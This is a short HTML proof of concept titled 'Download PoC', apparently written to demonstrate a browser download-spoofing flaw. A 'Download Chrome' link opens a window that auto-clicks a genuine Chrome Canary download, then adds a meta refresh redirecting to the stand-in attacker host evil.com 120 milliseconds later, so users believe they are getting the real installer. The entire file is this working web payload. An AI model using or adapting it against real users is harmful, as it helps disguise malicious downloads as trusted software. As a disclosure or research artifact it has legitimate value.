<!DOCTYPE html>
<html>

<title>Download PoC</title>
</head>

<body>

<a href="#" onclick="start()">Download Chrome</a>

<script>
function start() {

    var w = window.open();
    w.opener = null;

    w.document.write(`
        <a id="d" href="https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg">download</a>
        <script>
            document.getElementById("d").click();
        <\/script>
    `);

    // meta refresh shortly after
    setTimeout(function () {
        var meta = document.createElement("meta");
        meta.httpEquiv = "refresh";
        meta.content = "0; url=https://evil.com";
        document.head.appendChild(meta);
    }, 120);

}
</script>

</body>
